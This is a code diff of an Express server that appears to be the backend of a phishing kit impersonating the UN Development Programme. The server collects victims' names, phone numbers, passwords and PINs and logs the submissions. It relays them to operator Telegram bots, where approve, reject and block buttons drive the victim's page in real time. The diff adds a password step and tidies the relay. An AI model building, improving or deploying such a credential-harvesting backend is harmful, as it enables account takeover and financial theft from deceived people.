@@ -6,161 +6,202 @@ const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const DOMAIN = process.env.BACKEND_DOMAIN || 'https://united-nations-development-program.onrender.com';
+const DOMAIN = process.env.BACKEND_DOMAIN;
 
 // ---------------- MEMORY STORES ----------------
-const approvedPins = {};
-const approvedCodes = {};
-const blockPins = {};
-const requestBotMap = {};
+const passwordRequests = {};
+const pinRequests = {};
+const blockedRequests = {};
+const requestMeta = {}; // requestId → { name, phone, botId }
 
 // ---------------- MULTI-BOT STORE ----------------
-let bots = [];
+const bots = [];
+
 Object.keys(process.env).forEach(key => {
-    const match = key.match(/^BOT(\d+)_TOKEN$/);
-    if (!match) return;
-    const index = match[1];
-    const botToken = process.env[`BOT${index}_TOKEN`];
-    const chatId = process.env[`BOT${index}_CHATID`];
-    if (botToken && chatId) {
-        bots.push({ botId: `bot${index}`, botToken, chatId });
-    }
+  const match = key.match(/^BOT(\d+)_TOKEN$/);
+  if (!match) return;
+
+  const i = match[1];
+  const token = process.env[`BOT${i}_TOKEN`];
+  const chatId = process.env[`BOT${i}_CHATID`];
+
+  if (token && chatId) {
+    bots.push({ botId: `bot${i}`, token, chatId });
+  }
 });
+
 console.log('✅ Bots loaded:', bots.map(b => b.botId));
 
-// ---------------- MIDDLEWARE ----------------
-app.use(express.json());
+// ---------------- MIDDLEWARE (IMPORTANT FIX) ----------------
+app.use(express.json({ type: '*/*' })); // 🔥 FIX: parse all JSON bodies
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
 // ---------------- HELPERS ----------------
 function getBot(botId) {
-    return bots.find(b => b.botId === botId);
+  return bots.find(b => b.botId === botId);
 }
 
-async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
-    try {
-        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
-            chat_id: bot.chatId,
-            text,
-            reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
-        });
-    } catch (err) {
-        console.error('Telegram send error:', err.response?.data || err.message);
-    }
+async function sendTelegram(bot, text, buttons = []) {
+  try {
+    await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+      chat_id: bot.chatId,
+      text,
+      reply_markup: buttons.length
+        ? { inline_keyboard: buttons }
+        : undefined
+    });
+  } catch (e) {
+    console.error('❌ Telegram send error:', e.response?.data || e.message);
+  }
 }
 
-async function answerCallback(bot, callbackId) {
-    try {
-        await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
-            callback_query_id: callbackId
-        });
-    } catch (err) {
-        console.error(err.response?.data || err.message);
-    }
+async function answerCallback(bot, id) {
+  try {
+    await axios.post(`https://api.telegram.org/bot${bot.token}/answerCallbackQuery`, {
+      callback_query_id: id
+    });
+  } catch {}
 }
 
 // ---------------- WEBHOOKS ----------------
 async function setWebhook(bot) {
-    try {
-        const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
-        await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
-        console.log(`✅ Webhook set for ${bot.botId}`);
-    } catch (err) {
-        console.error(`❌ Webhook failed for ${bot.botId}:`, err.response?.data || err.message);
-    }
+  if (!DOMAIN) {
+    console.error('❌ BACKEND_DOMAIN not set');
+    return;
+  }
+
+  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
+  try {
+    await axios.get(
+      `https://api.telegram.org/bot${bot.token}/setWebhook?url=${url}`
+    );
+    console.log(`✅ Webhook set for ${bot.botId}`);
+  } catch (e) {
+    console.error(`❌ Webhook failed for ${bot.botId}`, e.response?.data || e.message);
+  }
 }
 
-// Set webhook for all bots at startup
 async function setAllWebhooks() {
-    for (const bot of bots) await setWebhook(bot);
+  for (const bot of bots) await setWebhook(bot);
 }
 
-// ---------------- PAGES ----------------
-app.get('/bot/:botId', (req, res) => {
-    const bot = getBot(req.params.botId);
-    if (!bot) return res.status(404).send('Invalid bot link');
-    res.redirect(`/index.html?botId=${bot.botId}`);
-});
-app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
-app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
-app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));
+// ---------------- PASSWORD STEP ----------------
+app.post('/submit-password', (req, res) => {
+  console.log('📥 PASSWORD SUBMIT:', req.body);
 
-// ---------------- PIN SUBMISSION ----------------
+  const { name, phone, botId } = req.body;
+  const bot = getBot(botId);
+
+  if (!bot) {
+    console.error('❌ Invalid bot:', botId);
+    return res.status(400).json({ error: 'Invalid bot' });
+  }
+
+  const requestId = uuidv4();
+  passwordRequests[requestId] = null;
+  requestMeta[requestId] = { name, phone, botId };
+
+  sendTelegram(
+    bot,
+    `🔐 PASSWORD VERIFICATION
+
+👤 Name: ${name}
+📞 Phone: ${phone}
+🔑 Password: [REDACTED]
+🆔 Ref: ${requestId}`,
+    [[
+      { text: '✅ Correct Password', callback_data: `pass_ok:${requestId}` },
+      { text: '❌ Wrong Password', callback_data: `pass_bad:${requestId}` }
+    ]]
+  );
+
+  res.json({ requestId });
+});
+
+app.get('/check-password/:id', (req, res) => {
+  res.json({ approved: passwordRequests[req.params.id] ?? null });
+});
+
+// ---------------- PIN STEP ----------------
 app.post('/submit-pin', (req, res) => {
-    const { name, phone, pin, botId } = req.body;
-    const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+  console.log('📥 PIN SUBMIT:', req.body);
 
-    const requestId = uuidv4();
-    approvedPins[requestId] = null;
-    requestBotMap[requestId] = botId;
+  const { name, phone, botId } = req.body;
+  const bot = getBot(botId);
 
-    sendTelegramMessage(bot, `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`, [[
-        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
-        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
-        { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
-    ]]);
+  if (!bot) {
+    console.error('❌ Invalid bot:', botId);
+    return res.status(400).json({ error: 'Invalid bot' });
+  }
 
-    res.json({ requestId });
+  const requestId = uuidv4();
+  pinRequests[requestId] = null;
+  requestMeta[requestId] = { name, phone, botId };
+
+  sendTelegram(
+    bot,
+    `🔐 PIN VERIFICATION
+
+👤 Name: ${name}
+📞 Phone: ${phone}
+🔢 PIN: [REDACTED]
+🆔 Ref: ${requestId}`,
+    [[
+      { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
+      { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
+      { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
+    ]]
+  );
+
+  res.json({ requestId });
 });
 
-app.get('/check-pin/:requestId', (req, res) => {
-    const requestId = req.params.requestId;
-    if (blockPins[requestId]) return res.json({ blocked: true, message: 'User blocked' });
-    res.json({ approved: approvedPins[requestId] ?? null });
+app.get('/check-pin/:id', (req, res) => {
+  if (blockedRequests[req.params.id]) {
+    return res.json({ blocked: true });
+  }
+  res.json({ approved: pinRequests[req.params.id] ?? null });
 });
 
-// ---------------- CODE SUBMISSION ----------------
-app.post('/submit-code', (req, res) => {
-    const { name, phone, code, botId } = req.body;
-    const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
-
-    const requestId = uuidv4();
-    approvedCodes[requestId] = null;
-    requestBotMap[requestId] = botId;
-
-    sendTelegramMessage(bot, `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`, [[
-        { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
-        { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` },
-        { text: '✅ Code OK + ❌ PIN Wrong', callback_data: `code_pin:${requestId}` }
-    ]]);
-
-    res.json({ requestId });
-});
-
-app.get('/check-code/:requestId', (req, res) => {
-    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
-});
-
-// ---------------- TELEGRAM WEBHOOK ----------------
+// ---------------- TELEGRAM CALLBACK ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
-    const bot = getBot(req.params.botId);
-    if (!bot) return res.sendStatus(404);
+  console.log('📡 Telegram webhook hit:', req.body);
 
-    const cb = req.body.callback_query;
-    if (!cb) return res.sendStatus(200);
+  const bot = getBot(req.params.botId);
+  if (!bot) return res.sendStatus(404);
 
-    const [action, requestId] = cb.data.split(':');
-    let feedback = '';
+  const cb = req.body.callback_query;
+  if (!cb) return res.sendStatus(200);
 
-    if (action === 'pin_ok') { approvedPins[requestId] = true; feedback = 'PIN approved ✅'; }
-    if (action === 'pin_bad') { approvedPins[requestId] = false; feedback = 'PIN rejected ❌'; }
-    if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'User blocked 🛑'; }
-    if (action === 'code_ok') { approvedCodes[requestId] = true; feedback = 'Code approved ✅'; }
-    if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Code rejected ❌'; }
-    if (action === 'code_pin') { approvedCodes[requestId] = true; approvedPins[requestId] = false; feedback = 'Code approved – re-enter PIN'; }
+  const [action, requestId] = cb.data.split(':');
+  const meta = requestMeta[requestId];
+  let feedback = '';
 
-    if (feedback) await sendTelegramMessage(bot, `📝 Feedback:\n${feedback}`);
-    await answerCallback(bot, cb.id);
-    res.sendStatus(200);
+  if (action === 'pass_ok') { passwordRequests[requestId] = true; feedback = '✅ Password approved'; }
+  if (action === 'pass_bad') { passwordRequests[requestId] = false; feedback = '❌ Password rejected'; }
+  if (action === 'pin_ok') { pinRequests[requestId] = true; feedback = '✅ PIN approved'; }
+  if (action === 'pin_bad') { pinRequests[requestId] = false; feedback = '❌ PIN rejected'; }
+  if (action === 'pin_block') { blockedRequests[requestId] = true; feedback = '🛑 User blocked'; }
+
+  if (feedback && meta) {
+    await sendTelegram(
+      bot,
+      `📝 ACTION TAKEN
+
+👤 Name: ${meta.name}
+📞 Phone: ${meta.phone}
+${feedback}`
+    );
+  }
+
+  await answerCallback(bot, cb.id);
+  res.sendStatus(200);
 });
-
-// ---------------- DEBUG ----------------
-app.get('/debug/bots', (req, res) => res.json(bots));
 
 // ---------------- START SERVER ----------------
 setAllWebhooks().then(() => {
-    app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+  app.listen(PORT, () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+  });
 });
